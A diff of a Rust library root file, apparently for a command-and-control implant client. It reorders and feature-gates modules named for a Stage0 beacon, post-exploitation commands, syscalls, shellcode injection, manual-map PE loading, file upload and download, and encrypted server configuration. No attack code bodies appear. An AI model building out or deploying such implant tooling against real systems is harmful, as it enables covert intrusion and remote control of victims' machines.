@@ -17,18 +17,18 @@ macro_rules! dbg_print {
     };
 }
 
-pub mod error;
-pub mod types;
-pub mod wire_ids;
 pub mod backoff;
+pub mod config;
 #[cfg(feature = "ws")]
 pub mod connection;
-pub mod handler;
-pub mod config;
-pub mod transport;
 pub mod crypto;
+pub mod error;
+pub mod handler;
+pub mod transport;
+pub mod types;
+pub mod wire_ids;
 
-// --- Post-ex (NOT in pure Stage0 / beacon) ---
+// --- Post-ex (in product minimal; optional for custom feature sets) ---
 #[cfg(feature = "post-ex")]
 pub mod executor;
 #[cfg(feature = "post-ex")]
@@ -60,14 +60,20 @@ pub mod loader;
 
 // Syscall / native helpers (Windows). Stage0 still links a thin subset; heavy BOF
 // paths remain behind feature "bof". Further strip planned in Phase 5.
-pub mod syscalls;
 pub mod native;
+pub mod syscalls;
 
-// Stage0 module package format + loader (L2 pipeline)
-pub mod module_package;
+// Stage0 module package format + loader (L2 pipeline) — only with module-loader
 #[cfg(feature = "module-loader")]
 pub mod module_loader;
+#[cfg(feature = "module-loader")]
+pub mod module_package;
+/// Process-isolated workers for product L2 (desktop / iso_host / inject).
+/// Stage0 never LoadLibrary/Manual-Map product modules — see docs/MODULE_WORKER_ISOLATION.md.
+#[cfg(feature = "module-loader")]
+pub mod module_supervisor;
 /// Manual-Map PE loader for L2 modules (no temp DLL).
+/// Product whitelist modules must not use this path (supervisor only).
 #[cfg(all(windows, feature = "mem-map"))]
 pub mod pe_map;
 
@@ -82,26 +88,25 @@ pub use native::{inject_shellcode, wait_inject_thread, InjectResult};
 pub mod fallback;
 
 // 重新导出常用类型
-pub use error::{ClientError, Result};
-pub use types::{
-    CommandPayload, CommandResult, MessageType, MessageWrapper,
-    RegisterPayload, ResponsePayload, SystemInfo,
-};
 pub use backoff::ExponentialBackoff;
+pub use config::{
+    get_aes_key, get_config_info, get_crypto_config_info, get_dns_resolver, get_heartbeat_interval,
+    get_server_url, validate_server_url, ConfigInfo, CryptoConfigInfo,
+};
 #[cfg(feature = "ws")]
 pub use connection::ConnectionManager;
+pub use crypto::{decrypt, encrypt};
+pub use error::{ClientError, Result};
 #[cfg(feature = "post-ex")]
 pub use executor::CommandExecutor;
-pub use handler::MessageHandler;
-pub use config::{
-    get_server_url, validate_server_url, get_config_info, ConfigInfo,
-    get_aes_key, get_crypto_config_info, CryptoConfigInfo,
-    get_heartbeat_interval, get_dns_resolver,
-};
 #[cfg(feature = "post-ex")]
-pub use fs::{ls, upload, download, FileInfo};
-pub use transport::{Transport, create_transport};
-pub use crypto::{encrypt, decrypt};
+pub use fs::{download, ls, upload, FileInfo};
+pub use handler::MessageHandler;
+pub use transport::{create_transport, Transport};
+pub use types::{
+    CommandPayload, CommandResult, MessageType, MessageWrapper, RegisterPayload, ResponsePayload,
+    SystemInfo,
+};
 
 pub use utils::get_agent_uuid;
 
@@ -110,7 +115,7 @@ pub use dotnet::DotNetExecutor;
 
 #[cfg(feature = "plugin")]
 pub use plugin_router::{
-    PluginRouter, PluginTask, PluginMetadata, BatchExecutionManager, BatchConfig, BufferedResult,
+    BatchConfig, BatchExecutionManager, BufferedResult, PluginMetadata, PluginRouter, PluginTask,
 };
 
 #[cfg(feature = "plugin")]
